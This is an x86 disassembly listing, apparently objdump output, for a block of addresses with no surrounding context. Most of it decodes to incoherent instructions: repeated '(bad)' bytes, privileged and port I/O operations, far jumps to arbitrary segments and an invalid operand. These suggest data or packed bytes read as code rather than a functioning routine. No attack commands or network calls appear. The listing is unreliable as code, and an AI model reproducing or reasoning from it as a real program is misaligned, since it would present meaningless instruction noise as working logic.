  41a04d:	(bad)  
  41a04f:	jmp    0xc76:0x57d7aad9
  41a056:	(bad)  
  41a057:	xchg   ebp,eax
  41a058:	pop    ebx
  41a059:	loopne 0x41a053
  41a05b:	pop    es
  41a05c:	inc    ebx
  41a05d:	add    eax,0x7a960d9d
  41a062:	int    0xe2
  41a064:	mov    dl,0xe6
  41a066:	jno    0x41a00e
  41a068:	test   BYTE PTR [edx],ah
  41a06a:	inc    edx
  41a06b:	jp     0x419fff
  41a06d:	lock sahf 
  41a06f:	jno    0x41a056
  41a071:	xor    DWORD PTR [esi-0x58],esi
  41a074:	pop    ebx
  41a075:	mov    dh,0x69
  41a077:	ror    esp,1
  41a079:	xchg   ebx,eax
  41a07a:	dec    esi
  41a07b:	push   ss
  41a07c:	jp     0x41a0d7
  41a07e:	loope  0x41a03d
  41a080:	and    ebp,ecx
  41a082:	and    esi,DWORD PTR [edx]
  41a084:	pushf  
  41a085:	les    ebx,FWORD PTR [ebx-0x7c]
  41a088:	in     al,0x37
  41a08a:	mov    ds:0xbd955171,eax
  41a08f:	and    DWORD PTR [ebp+0x44],edx
  41a092:	adc    al,0x55
  41a094:	mov    edx,0xb9812a2b
  41a099:	icebp  
  41a09a:	ret    
  41a09b:	xor    ebp,DWORD PTR [esi*4+0x37f0664c]
  41a0a2:	xchg   edx,eax
  41a0a3:	inc    ebp
  41a0a4:	pop    esp
  41a0a5:	lds    eax,FWORD PTR [ebx+ebx*2+0x5c7e4466]
  41a0ac:	in     eax,dx
  41a0ad:	and    bl,ch
  41a0af:	stos   BYTE PTR es:[edi],al
  41a0b0:	cmp    al,0xe6
  41a0b2:	push   ss
  41a0b3:	sti    
  41a0b4:	test   eax,0xee8ae8f3
  41a0b9:	in     eax,dx
  41a0ba:	dec    edx
  41a0bb:	out    0x8,eax
  41a0bd:	es cwde 
  41a0bf:	push   cs
  41a0c0:	call   0x44f6:0x3de4d5ce
  41a0c7:	adc    al,0xa4
  41a0c9:	pushf  
  41a0ca:	rcl    BYTE PTR [eax-0x7455c9d4],1
  41a0d0:	add    al,0x4d
  41a0d2:	test   eax,0xdf811849
  41a0d7:	push   ss
  41a0d8:	xor    DWORD PTR [eax],ebx
  41a0da:	and    bl,BYTE PTR [edx+0x49]
  41a0dd:	xor    eax,0x7b53
  41a0e2:	add    BYTE PTR [eax],al
  41a0e4:	add    BYTE PTR [eax],al
  41a0e6:	xchg   edi,edx
  41a0e8:	dec    ebp
  41a0e9:	jnp    0x41a148
  41a0eb:	sti    
  41a0ec:	mov    bh,0xff
  41a0ee:	ds aad 0x54
  41a0f1:	ret    0x30c9
  41a0f4:	call   FWORD PTR [ebp+esi*8+0x2200019a]
  41a0fb:	pop    es
  41a0fc:	add    BYTE PTR [eax],al
  41a0fe:	dec    edx
  41a0ff:	gs nop
  41a101:	hlt    
  41a102:	cs jge 0x41a138
  41a105:	dec    eax
  41a106:	inc    ebp
  41a107:	inc    ebp
  41a108:	dec    esp
  41a109:	push   es
  41a10a:	jne    0x41a16a
  41a10c:	inc    eax
  41a10d:	cmp    edi,ecx
  41a10f:	and    al,0x63
  41a111:	pop    es
  41a112:	jne    0x41a185
  41a114:	fldcw  WORD PTR [ebx]
  41a116:	mov    DWORD PTR [eax-0x4a463086],ebp
  41a11c:	cmp    BYTE PTR [eax+0x5],0x2a
  41a120:	or     al,0x73
  41a122:	neg    BYTE PTR [eax]
  41a124:	sbb    DWORD PTR [eax],0xffffff83
  41a127:	lods   al,BYTE PTR ds:[esi]
  41a128:	and    ecx,DWORD PTR ds:[edi+ebx*4-0x68fa028f]
  41a130:	cli    
  41a131:	outs   dx,DWORD PTR ds:[esi]
  41a132:	ror    BYTE PTR ds:0xf7b7ec63,0xc4
  41a139:	pop    ds
  41a13a:	cld    
  41a13b:	add    eax,0x98180933
  41a140:	jnp    0x41a149
  41a142:	cmp    al,0xb4
  41a144:	xor    al,0x71
  41a146:	cli    
  41a147:	jle    0x41a16f
  41a149:	test   BYTE PTR [ebx+0x75],0x92
  41a14d:	or     DWORD PTR [ecx+0x74d887e9],edi
  41a153:	cld    
  41a154:	xchg   BYTE PTR [edx-0x3ffaf305],cl
  41a15a:	bound  edx,QWORD PTR [eax]
  41a15c:	cmp    ch,dh
  41a15e:	cdq    
  41a15f:	shl    esp,0xd8
  41a162:	call   0x1e72:0x131df40f
  41a169:	sub    dh,BYTE PTR ss:[ecx]
  41a16c:	shl    DWORD PTR [ebp+0x6ed16ad9],0xec
  41a173:	cmp    al,0x0
  41a175:	dec    esp
  41a176:	ins    DWORD PTR es:[edi],dx
  41a177:	nop
  41a178:	mov    edx,0xdfc3ffe9
  41a17d:	iret   
  41a17e:	and    eax,0x154bc65b
  41a183:	push   esi
  41a184:	jg     0x41a12e
  41a186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a187:	push   0xfffffffc
  41a189:	pushf  
  41a18a:	push   edi
  41a18b:	sub    DWORD PTR [esi-0x3f8e8870],eax
  41a191:	pop    ds
  41a192:	xlat   BYTE PTR ds:[ebx]
  41a193:	mov    ds:0xbbb69452,al
  41a198:	inc    edi
  41a199:	pop    ebp
  41a19a:	mov    edx,0x92c3627d
  41a19f:	jns    0x41a200
  41a1a1:	ins    DWORD PTR es:[edi],dx
  41a1a2:	ret    0x5699
  41a1a5:	sar    BYTE PTR [edx+0x38],1
  41a1a8:	jae    0x41a188
  41a1aa:	mov    ebx,0x92b17b6c
  41a1af:	jl     0x41a157
  41a1b1:	dec    ebx
  41a1b2:	ret    
  41a1b3:	ret    
  41a1b4:	out    dx,al
  41a1b5:	lar    edi,WORD PTR [esi+eax*4-0x2]
  41a1ba:	add    dl,bl
  41a1bc:	inc    eax
  41a1bd:	xchg   ecx,eax
  41a1be:	repz add BYTE PTR [ebp-0x76],cl
  41a1c2:	mov    ebp,0x5bc08757
  41a1c7:	enter  0x2727,0x8f
  41a1cb:	xchg   ecx,eax
  41a1cc:	fcmove st,st(3)
  41a1ce:	or     dh,BYTE PTR [esi]
  41a1d0:	push   edi
  41a1d1:	push   0xffffffc5
  41a1d3:	dec    edi
  41a1d4:	and    DWORD PTR [esi],ebp
  41a1d6:	mov    DWORD PTR ss:[ecx],ebx
  41a1d9:	bound  esp,QWORD PTR [ebp+0x5e14caba]
  41a1df:	sti    
  41a1e0:	(bad)  
  41a1e1:	popa   
  41a1e2:	div    DWORD PTR [ebx+eiz*8]
  41a1e5:	sysenter 
  41a1e7:	(bad)  [esi+0x42da2d59]
  41a1ed:	adc    eax,0xd2767e5d
  41a1f2:	bound  esi,QWORD PTR [ebp+0xd6808c4]
  41a1f8:	not    BYTE PTR [eax-0x55]
  41a1fb:	(bad)  
  41a1fc:	outs   dx,BYTE PTR ds:[esi]
  41a1fd:	(bad)  
  41a1fe:	xlat   BYTE PTR ds:[ebx]
  41a1ff:	loop   0x41a1de
  41a201:	sysexit 
  41a203:	mov    ch,0xb1
  41a205:	inc    ebx
  41a206:	xor    BYTE PTR [eax+0xff5fb9e],dl
  41a20c:	mov    ch,0xed
  41a20e:	int3   
  41a20f:	push   eax
  41a210:	cmp    ecx,DWORD PTR ds:0x9880f80b
  41a216:	mov    cl,0x8d
  41a218:	sub    DWORD PTR [ebx+0x4f],esi
  41a21b:	add    BYTE PTR [ecx+0x63],dh
  41a21e:	(bad)  
  41a21f:	sub    eax,0xf565bb90
  41a224:	pop    eax
  41a225:	inc    BYTE PTR [ebp+ebx*2+0x6e548ecf]
  41a22c:	xchg   edx,eax
  41a22d:	cld    
  41a22e:	inc    edx
  41a22f:	lods   al,BYTE PTR ds:[esi]
  41a230:	pop    ecx
  41a231:	lds    ebx,FWORD PTR [eax+ecx*2]
  41a234:	xchg   ebp,eax
  41a235:	shl    DWORD PTR [edx],1
  41a237:	mov    ah,0x71
  41a239:	(bad)  
  41a23b:	inc    ebp
  41a23c:	sub    bh,ch
  41a23e:	aam    0x28
  41a240:	xchg   BYTE PTR [edx+0x77a3b69b],ch
  41a246:	loopne 0x41a262
  41a248:	fs or  DWORD PTR cs:[edx],eax
  41a24c:	call   0xa98d4dda
  41a251:	add    eax,0x522bef0d
  41a256:	inc    BYTE PTR [ebx]
  41a258:	adc    eax,0xdd4fc6b4
  41a25d:	lea    eax,ds:0xb9569ba8
  41a263:	mul    BYTE PTR [edi]
  41a265:	sbb    eax,0x369e7fd6
  41a26a:	daa    
  41a26b:	in     al,dx
  41a26c:	sti    
  41a26d:	jmp    0x2209:0xe8393e4e
  41a274:	push   esp
  41a275:	rcl    DWORD PTR [edx-0x17],cl
  41a278:	mov    es,WORD PTR [ebx+edi*8]
  41a27b:	scas   al,BYTE PTR es:[edi]
  41a27c:	sub    eax,0xe4520fc
  41a281:	scas   eax,DWORD PTR es:[edi]
  41a282:	push   0xd3795667
  41a287:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41a289:	call   0x6dbc:0x2a8714d4
  41a290:	addr16 cdq 
  41a292:	mov    bh,0x82
  41a294:	int3   
  41a295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a296:	cmp    al,0xf5
  41a298:	jp     0x41a29e
  41a29a:	xor    ebx,DWORD PTR [eax]
  41a29c:	jne    0x41a25c
  41a29e:	push   edi
  41a29f:	or     eax,0x680fad7b
  41a2a4:	jl     0x41a23d
  41a2a6:	add    edi,DWORD PTR [ecx]
  41a2a8:	jae    0x41a28c
  41a2aa:	push   ebp
  41a2ab:	sub    DWORD PTR [ecx],0xdfbb1818
  41a2b1:	pop    eax
  41a2b2:	and    ecx,edx
  41a2b4:	xchg   ecx,eax
  41a2b5:	out    dx,eax
  41a2b6:	das    
  41a2b7:	out    dx,eax
  41a2b8:	test   DWORD PTR [eax+0x25],0x753b8c09
  41a2bf:	ins    BYTE PTR es:[edi],dx
  41a2c0:	mov    ecx,0x549d95d4
  41a2c5:	cmp    DWORD PTR [ecx+0x76b0c7c],eax
  41a2cb:	pop    esp
  41a2cc:	ss fwait
  41a2ce:	out    0x9,eax
  41a2d0:	push   ebx
  41a2d1:	dec    edi
  41a2d2:	push   eax
  41a2d3:	lods   al,BYTE PTR ds:[esi]
  41a2d4:	je     0x41a330
  41a2d6:	imul   ebx,ebx,0xe9fbc38f
  41a2dc:	bnd ds jbe 0x41a2ac
  41a2e0:	add    BYTE PTR [ebp+edi*8+0x15201651],bh
  41a2e7:	icebp  
  41a2e8:	leave  
  41a2e9:	push   edx
  41a2ea:	lock dec esp
  41a2ec:	in     eax,dx
  41a2ed:	cmc    
  41a2ee:	addr16 mov ebx,0xd0e35deb
  41a2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2f5:	push   ebp
  41a2f6:	xor    bl,bh
  41a2f8:	inc    ebp
  41a2f9:	mov    ebx,0xa15d502e
  41a2fe:	sbb    al,0x56
  41a300:	xchg   edi,eax
  41a301:	cmp    eax,0x7fc683f7
  41a306:	xor    eax,0x6ba5a29d
  41a30b:	sbb    ebp,edx
  41a30d:	leave  
  41a30e:	adc    al,0x39
  41a310:	cmp    ebp,0xffffff84
  41a313:	popf   
  41a314:	mov    dl,0x2c
  41a316:	in     eax,0xac
  41a318:	cwde   
  41a319:	loope  0x41a350
  41a31b:	mov    ah,0x0
  41a31d:	mov    ch,0x6e
  41a31f:	lds    ebx,FWORD PTR [edx-0x4a]
  41a322:	aas    
  41a323:	retf   
  41a324:	push   esi
  41a325:	sub    esi,eax
  41a327:	jbe    0x41a2fd
  41a329:	rol    edx,1
  41a32b:	sbb    al,0x9c
  41a32d:	jmp    0xd0cf:0x870246b6
  41a334:	lahf   
  41a335:	jle    0x41a313
  41a337:	lods   eax,DWORD PTR ds:[esi]
  41a338:	add    cl,dh
  41a33a:	fild   WORD PTR [eax-0x30]
  41a33d:	imul   ebp,DWORD PTR [ebp+0x5b],0xffffffa3
  41a341:	fst    st(0)
  41a343:	or     dh,BYTE PTR [eax+0x78af8923]
  41a349:	fistp  DWORD PTR [esp+edi*4]
  41a34c:	out    dx,al
  41a34d:	jo     0x41a2d5
  41a34f:	cdq    
  41a350:	loop   0x41a354
  41a352:	xchg   edx,eax
  41a353:	out    dx,eax
  41a354:	fyl2xp1 
  41a356:	sub    dl,BYTE PTR [esi]
  41a358:	xchg   DWORD PTR [ebx-0x5d],esp
  41a35b:	adc    edi,esi
  41a35d:	cmp    edi,DWORD PTR [esi-0x42]
  41a360:	out    0xc2,al
  41a362:	inc    esp
  41a363:	in     eax,0x6a
  41a365:	loope  0x41a349
  41a367:	outs   dx,DWORD PTR ds:[esi]
  41a368:	stos   DWORD PTR es:[edi],eax
  41a369:	xchg   ebp,eax
  41a36a:	cmp    DWORD PTR [ebx+0x56],eax
  41a36d:	xchg   edx,eax
  41a36e:	mov    edi,fs
  41a370:	inc    ebx
  41a371:	cwde   
  41a372:	sub    eax,0x3784f799
  41a377:	(bad)  
  41a378:	loope  0x41a32d
  41a37a:	push   ds
  41a37b:	adc    al,0x95
  41a37d:	mov    ebp,0xa76b2114
  41a382:	jb     0x41a3a1
  41a384:	and    dl,BYTE PTR [eax+0x57f862f9]
  41a38a:	dec    eax
  41a38b:	popa   
  41a38c:	(bad)  
  41a38d:	aad    0xef
  41a38f:	and    edi,edx
  41a391:	call   0xbc8d:0x80f62483
  41a398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a399:	das    
  41a39a:	fstp   DWORD PTR [esp+ebx*1-0x6cd7a7]
  41a3a1:	dec    ebp
  41a3a2:	mov    ebx,0xd4b0fa0f
  41a3a7:	inc    esp
  41a3a8:	fs xchg ebx,eax
  41a3aa:	test   eax,0x57e2b9ba
  41a3af:	and    BYTE PTR [edx-0x16],0x7
  41a3b3:	push   edx
  41a3b4:	or     cl,bl
  41a3b6:	or     DWORD PTR [edi-0x8],ebx
  41a3b9:	xlat   BYTE PTR ds:[ebx]
  41a3ba:	jmp    FWORD PTR [ebx+ebx*2]
  41a3bd:	sbb    al,0x6e
  41a3bf:	pop    ebp
  41a3c0:	jnp    0x41a3f4
  41a3c2:	add    dl,dl
  41a3c4:	xchg   edx,eax
  41a3c5:	push   ss
  41a3c6:	push   ebp
  41a3c7:	shl    BYTE PTR [eax],0xd5
  41a3ca:	not    DWORD PTR [edx-0x613e3461]
  41a3d0:	and    ch,BYTE PTR [ebx+ecx*1+0x656ca5c1]
  41a3d7:	add    eax,0xe1f5a1ab
  41a3dc:	fild   DWORD PTR [eax-0x31]
  41a3df:	cwde   
  41a3e0:	jp     0x41a444
  41a3e2:	out    0xcb,al
  41a3e4:	xor    ah,BYTE PTR [esi-0x295949a9]
  41a3ea:	add    DWORD PTR [edx-0x2a],edx
  41a3ed:	stos   BYTE PTR es:[edi],al
  41a3ee:	sti    
  41a3ef:	mov    eax,0xc1f1296a
  41a3f4:	out    0x39,eax
  41a3f6:	cmp    DWORD PTR ds:0x3f9bf023,ecx
  41a3fc:	xchg   edi,eax
  41a3fd:	mov    eax,ds:0xa55982e3
  41a402:	jg     0x41a412
  41a404:	xchg   esi,eax
  41a405:	cmp    eax,0x836b5ac1
  41a40a:	data16 jg 0x41a3e7
  41a40d:	out    dx,al
  41a40e:	jmp    0x41a39e
  41a410:	out    0xa1,al
  41a412:	adc    esi,eax
  41a414:	sbb    ah,BYTE PTR ds:0x97d283e9
  41a41a:	inc    ebx
  41a41b:	lock dec edx
  41a41d:	clc    
  41a41e:	push   edx
  41a41f:	mov    cs,edi
  41a421:	test   eax,0xd125c433
  41a426:	adc    BYTE PTR [ebx],cl
  41a428:	mov    ah,0xe7
  41a42a:	mul    BYTE PTR [esi+0x342924d]
  41a430:	mov    ds:0x5ac3da51,al
  41a435:	adc    edi,DWORD PTR [ebp-0x2b]
  41a438:	mov    DWORD PTR [edx-0x34f72051],0x98eae923
  41a442:	enter  0xe69b,0xb1
  41a446:	xchg   edx,eax
  41a447:	jle    0x41a417
  41a449:	xchg   ecx,eax
  41a44a:	js     0x41a49c
  41a44c:	sub    ecx,esp
  41a44e:	push   0xfffffff3
  41a450:	sldt   ecx
  41a453:	aam    0x12
  41a455:	std    
  41a456:	outs   dx,BYTE PTR ds:[esi]
  41a457:	and    eax,edx
  41a459:	ds push es
  41a45b:	fbstp  TBYTE PTR [edx+0x130160c8]
  41a461:	add    cl,BYTE PTR [eax]
  41a463:	adc    eax,0x58e999bd
  41a468:	div    ebx
  41a46a:	bound  esp,QWORD PTR [ecx+0x345c16b3]
  41a470:	jo     0x41a4e4
  41a472:	imul   edi,edx,0x37c16735
  41a478:	xchg   ecx,eax
  41a479:	pop    esi
  41a47a:	iret   
  41a47b:	xchg   esi,eax
  41a47c:	xor    bl,BYTE PTR [esi-0x66]
  41a47f:	repnz fidivr DWORD PTR [ebx]
  41a482:	adc    DWORD PTR [ebx-0x68b7da68],esi
  41a488:	jmp    0x7856:0x60097ddf
  41a48f:	into   
  41a490:	mov    cl,0x1
  41a492:	add    edx,DWORD PTR [esi]
  41a494:	mov    bh,0x1b
  41a496:	in     al,0xb3
  41a498:	xchg   edx,eax
  41a499:	push   0xffffffd8
  41a49b:	sub    BYTE PTR [ebx+0x48cfb554],0x1d
  41a4a2:	add    BYTE PTR [eax],0x9c
  41a4a5:	sahf   
  41a4a6:	add    BYTE PTR [ecx],0x7e
  41a4a9:	inc    edx
  41a4aa:	mov    ebp,0x8322d2af
  41a4af:	or     al,0x45
  41a4b1:	dec    eax
  41a4b2:	int    0x60
  41a4b4:	aaa    
  41a4b5:	jb     0x41a43e
  41a4b7:	xor    eax,0xc886ca28
  41a4bc:	push   edi
  41a4bd:	jl     0x41a525
  41a4bf:	adc    al,0x86
  41a4c1:	sub    al,0xd
  41a4c3:	stc    
  41a4c4:	push   ebx
  41a4c5:	fimul  DWORD PTR [ebp-0x48]
  41a4c8:	push   esp
  41a4c9:	jns    0x41a4ca
  41a4cb:	or     BYTE PTR [esi],ch
  41a4cd:	adc    esp,DWORD PTR [edi]
  41a4cf:	cmc    
  41a4d0:	out    0x41,eax
  41a4d2:	dec    ebp
  41a4d3:	pop    eax
  41a4d4:	dec    ebx
  41a4d5:	and    ch,dl
  41a4d7:	repz fisub WORD PTR [edi]
  41a4da:	fwait
  41a4db:	dec    edi
  41a4dc:	sbb    al,0x29
  41a4de:	and    cl,BYTE PTR [edi]
  41a4e0:	popf   
  41a4e1:	jle    0x41a524
  41a4e3:	fmul   st(7),st
  41a4e5:	not    DWORD PTR [ebx+edx*4-0x5021eb2b]
  41a4ec:	and    al,0x25
  41a4ee:	jge    0x41a4f9
  41a4f0:	pop    es
  41a4f1:	mov    DWORD PTR [ebp+0x5ce2e9b2],esi
  41a4f7:	xor    dh,bl
  41a4f9:	push   ebp
  41a4fa:	or     ebx,esp
  41a4fc:	or     DWORD PTR [eax],esi
  41a4fe:	add    edi,DWORD PTR [ecx]
  41a500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a501:	bound  edi,QWORD PTR [esi+eiz*2-0x4f]
  41a505:	(bad)  
  41a506:	popf   
  41a507:	mov    al,0x7
  41a509:	jo     0x41a4f6
  41a50b:	mov    eax,DWORD PTR [edx]
  41a50d:	and    al,dl
  41a50f:	cmp    BYTE PTR [edx-0x50d4de71],bh
  41a515:	pop    ds
  41a516:	adc    al,0xe5
  41a518:	jns    0x41a584
  41a51a:	repnz std 
  41a51c:	pop    es
  41a51d:	call   DWORD PTR [edx]
  41a51f:	fisttp WORD PTR [ebp-0x4d]
  41a522:	mov    eax,ds:0x1a02415
  41a527:	lock push es
  41a529:	cdq    
  41a52a:	mov    eax,ds:0x7bf6427
  41a52f:	mov    ds:0xc5650392,al
  41a534:	jno    0x41a53f
  41a536:	cwde   
  41a537:	sub    eax,DWORD PTR [esi]
  41a539:	jb     0x41a4fc
  41a53b:	push   0x78
  41a53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a53e:	arpl   cx,cx
  41a540:	jno    0x41a504
  41a542:	cmp    DWORD PTR [ecx],edi
  41a544:	je     0x41a517
  41a546:	inc    ebp
  41a547:	test   al,0xbb
  41a549:	mov    edx,0xf7c34067
  41a54e:	stos   BYTE PTR es:[edi],al
  41a54f:	retf   
  41a550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a551:	push   eax
  41a552:	icebp  
  41a553:	fs push esp
  41a555:	xlat   BYTE PTR ds:[ebx]
  41a556:	mov    edx,0x5364b3eb
  41a55b:	inc    ebx
  41a55c:	inc    esi
  41a55d:	das    
  41a55e:	stos   DWORD PTR es:[edi],eax
  41a55f:	jns    0x41a566
  41a561:	sub    al,0x9c
  41a563:	jle    0x41a53d
  41a565:	in     al,0x9
  41a567:	adc    BYTE PTR [esi+0x61],0xc1
  41a56b:	loop   0x41a5cd
  41a56d:	push   ss
  41a56e:	icebp  
  41a56f:	jl     0x41a5a0
  41a571:	bound  edx,QWORD PTR [edi]
  41a573:	and    esi,DWORD PTR [edx+0x19]
  41a576:	outs   dx,DWORD PTR ds:[esi]
  41a577:	ins    DWORD PTR es:[edi],dx
  41a578:	pop    ss
  41a579:	sbb    ch,0xa8
  41a57c:	loop   0x41a516
  41a57e:	push   ecx
  41a57f:	dec    eax
  41a580:	mov    ecx,DWORD PTR [eax+0x12]
  41a583:	adc    ch,BYTE PTR [esi+0x39]
  41a586:	ins    BYTE PTR es:[edi],dx
  41a587:	inc    edx
  41a588:	lds    esp,FWORD PTR [ebx-0x9]
  41a58b:	mov    WORD PTR [esi],ds
  41a58d:	xchg   ebp,eax
  41a58e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a58f:	test   DWORD PTR [esi-0x4938ced0],eax
  41a595:	inc    esp
  41a596:	clc    
  41a597:	push   0x8
  41a599:	jg     0x41a524
  41a59b:	sub    edi,eax
  41a59d:	mov    dl,BYTE PTR ss:[ecx+0x35]
  41a5a1:	div    DWORD PTR [esp+ebp*8-0x42]
  41a5a5:	pop    edx
  41a5a6:	icebp  
  41a5a7:	adc    dl,al
  41a5a9:	inc    ebp
  41a5aa:	and    BYTE PTR [edx+0x17c00e88],al
  41a5b0:	lods   al,BYTE PTR ds:[esi]
  41a5b1:	sbb    al,0xa2
  41a5b3:	push   edx
  41a5b4:	xor    al,0x36
  41a5b6:	lock push cs
  41a5b8:	loope  0x41a603
  41a5ba:	mov    edi,0x8a922495
  41a5bf:	mov    cl,0x99
  41a5c1:	mov    cl,BYTE PTR [edi-0x20]
  41a5c4:	icebp  
  41a5c5:	inc    ebx
  41a5c6:	mov    cl,0x61
  41a5c8:	jmp    0x87831f3a
  41a5cd:	fild   WORD PTR [edx+0x6d232b11]
  41a5d3:	or     DWORD PTR [eax+0x55],edx
  41a5d6:	pop    eax
  41a5d7:	mov    esi,0x30520432
  41a5dc:	cmp    ecx,DWORD PTR [edx-0x71]
  41a5df:	dec    ebp
  41a5e0:	lods   eax,DWORD PTR ds:[esi]
  41a5e1:	jb     0x41a578
  41a5e3:	retf   0x5fac
  41a5e6:	(bad)  
  41a5e8:	adc    ch,al
  41a5ea:	mov    eax,ds:0x81b8a574
  41a5ef:	lea    edx,[esi+0x6c352b7e]
  41a5f5:	stc    
  41a5f6:	jp     0x41a592
  41a5f8:	dec    ebx
  41a5f9:	add    al,0x30
  41a5fb:	lahf   
  41a5fc:	push   ss
  41a5fd:	cld    
  41a5fe:	xchg   edx,eax
  41a5ff:	mov    al,0x7f
  41a601:	and    BYTE PTR [edx+0x7c0a0382],dl
  41a607:	sbb    eax,0x187fe3a7
  41a60c:	ror    DWORD PTR [eax+ebx*2],0xc5
  41a610:	inc    eax
  41a611:	int    0x50
  41a613:	lahf   
  41a614:	inc    ecx
  41a615:	imul   esi,DWORD PTR [eax-0x1f],0x1f
  41a619:	or     al,0xab
  41a61b:	or     BYTE PTR [ebx],cl
  41a61d:	daa    
  41a61e:	xchg   ecx,eax
  41a61f:	lahf   
  41a620:	lock jmp 0x401b:0x208995d2
  41a628:	lds    edi,FWORD PTR [eax-0x62a7b7c7]
  41a62e:	loopne 0x41a5ef
  41a630:	fimul  DWORD PTR [edi]
  41a632:	es shl ebp,1
  41a635:	xor    ax,0xf861
  41a639:	stos   DWORD PTR es:[edi],eax
  41a63a:	ja     0x41a684
  41a63c:	(bad)  
  41a63d:	push   esi
  41a63e:	pop    eax
  41a63f:	adc    BYTE PTR [ecx+eax*4],ch
  41a642:	add    eax,0x341435e7
  41a647:	ins    DWORD PTR es:[edi],dx
  41a648:	addr16 sbb al,0xaf
  41a64b:	stc    
  41a64c:	sbb    BYTE PTR [esi],dh
  41a64e:	and    al,0x9b
  41a650:	pop    ecx
  41a651:	sub    esi,0xb262882b
  41a657:	shl    BYTE PTR [eax-0x6c],0x36
  41a65b:	arpl   WORD PTR [esi],si
  41a65d:	sub    esi,eax
  41a65f:	jg     0x41a6d9
  41a661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a662:	xlat   BYTE PTR ds:[ebx]
  41a663:	inc    ecx
  41a664:	lea    ebx,[edi]
  41a666:	je     0x41a681
  41a668:	test   eax,0xbbb0d8fb
  41a66d:	mov    bh,0x77
  41a66f:	(bad)  
  41a670:	pop    eax
  41a671:	cmp    bh,BYTE PTR [edi-0x35]
  41a674:	or     dh,0xfe
  41a677:	add    BYTE PTR ds:0xc3e84444,0xfe
  41a67e:	stos   DWORD PTR es:[edi],eax
  41a67f:	jno    0x41a621
  41a681:	(bad)  
  41a682:	jno    0x41a65e
  41a684:	jg     0x41a65a
  41a686:	xchg   DWORD PTR [ebx+0x4b5a035b],ebx
  41a68c:	test   al,0x26
  41a68e:	dec    ecx
  41a68f:	lahf   
  41a690:	ja     0x41a642
  41a692:	jecxz  0x41a68e
  41a694:	push   ecx
  41a695:	adc    DWORD PTR [esp+eax*8+0x3b],ebp
  41a699:	pop    ds
  41a69a:	or     BYTE PTR [esp+ebx*8],0xd2
  41a69e:	aas    
  41a69f:	pop    edx
  41a6a0:	cmc    
  41a6a1:	inc    edi
  41a6a2:	push   eax
  41a6a3:	iret   
  41a6a4:	test   al,0x1a
  41a6a6:	iret   
  41a6a7:	xchg   edi,eax
  41a6a8:	ret    
  41a6a9:	arpl   WORD PTR [ebx],dx
  41a6ab:	mov    edi,0x8a96533e
  41a6b0:	inc    esi
  41a6b1:	in     al,dx
  41a6b2:	push   ds
  41a6b3:	and    esp,DWORD PTR [edx-0x2b4cddce]
  41a6b9:	jl     0x41a6af
  41a6bb:	adc    al,0xd9
  41a6bd:	sbb    cl,BYTE PTR es:[esi+0x68]
  41a6c1:	mov    ?,WORD PTR [edx]
  41a6c3:	ret    
  41a6c4:	mov    edi,0x5dcf8966
  41a6c9:	or     al,0x18
  41a6cb:	add    DWORD PTR [edi],ecx
  41a6cd:	sub    al,ch
  41a6cf:	clc    
  41a6d0:	and    dl,dl
  41a6d2:	cmp    DWORD PTR [ebp+0x36],eax
  41a6d5:	xlat   BYTE PTR ds:[ebx]
  41a6d6:	pop    ss
  41a6d7:	outs   dx,BYTE PTR ds:[esi]
  41a6d8:	jno    0x41a73f
  41a6da:	pop    ss
  41a6db:	in     al,dx
  41a6dc:	pop    edi
  41a6dd:	pop    ebx
  41a6de:	cwde   
  41a6df:	jmp    0x658cf1a2
  41a6e4:	popf   
  41a6e5:	push   0xaebe10df
  41a6ea:	sbb    bh,BYTE PTR [esi+eiz*4]
  41a6ed:	mov    edx,DWORD PTR [edi+0x348af4cf]
  41a6f3:	push   ebx
  41a6f4:	jg     0x41a689
  41a6f6:	jnp    0x41a6c9
  41a6f8:	fidiv  WORD PTR [ebp-0x65887171]
  41a6fe:	sbb    DWORD PTR [edx+0xc],esi
  41a701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a702:	mov    BYTE PTR [eax],bl
  41a704:	in     eax,0x22
  41a706:	push   edi
  41a707:	std    
  41a708:	push   ds
  41a709:	adc    ch,bl
  41a70b:	pop    esi
  41a70c:	mov    cl,0x66
  41a70e:	pop    es
  41a70f:	mov    ds:0x1046ee2f,al
  41a714:	loop   0x41a738
  41a716:	cmp    DWORD PTR [eax-0x7a5dcb54],0x8
  41a71d:	jbe    0x41a6fd
  41a71f:	push   esp
  41a720:	scas   al,BYTE PTR es:[edi]
  41a721:	push   edi
  41a722:	cli    
  41a723:	or     dl,BYTE PTR [edx+0x6228e42c]
  41a729:	adc    eax,0x8135c275
  41a72e:	es add eax,0x933d8ab1
  41a734:	or     edx,edx
  41a736:	dec    eax
  41a737:	fild   DWORD PTR [ebp+0x6c]
  41a73a:	gs ret 
  41a73c:	stos   BYTE PTR es:[edi],al
  41a73d:	inc    ecx
  41a73e:	cli    
  41a73f:	pop    eax
  41a740:	sbb    ah,BYTE PTR [ecx+0x68]
  41a743:	cmc    
  41a744:	neg    BYTE PTR [eax-0x7b]
  41a747:	fistp  DWORD PTR [ebp+0x6a9765aa]
  41a74d:	push   cs
  41a74e:	popa   
  41a74f:	push   ecx
  41a750:	aas    
  41a751:	and    DWORD PTR [eax+ecx*8+0x46a77eda],eax
  41a758:	out    0xbd,al
  41a75a:	sbb    esp,edi
  41a75c:	lds    edi,FWORD PTR [ebp+0x2d181d81]
  41a762:	lods   eax,DWORD PTR ds:[esi]
  41a763:	aas    
  41a764:	push   esp
  41a765:	loopne 0x41a70c
  41a767:	jns    0x41a770
  41a769:	pop    ss
  41a76a:	dec    esi
  41a76b:	test   eax,0x6e85c362
  41a770:	fldcw  WORD PTR [ebx-0x6829fca5]
  41a776:	in     eax,dx
  41a777:	arpl   WORD PTR [ebx+0x46],bp
  41a77a:	mov    dl,0xa3
  41a77c:	cmp    eax,0x62505575
  41a781:	mov    bh,0x59
  41a783:	inc    eax
  41a784:	sbb    bh,ah
  41a786:	and    BYTE PTR [ebp+0x2cf0c4c2],al
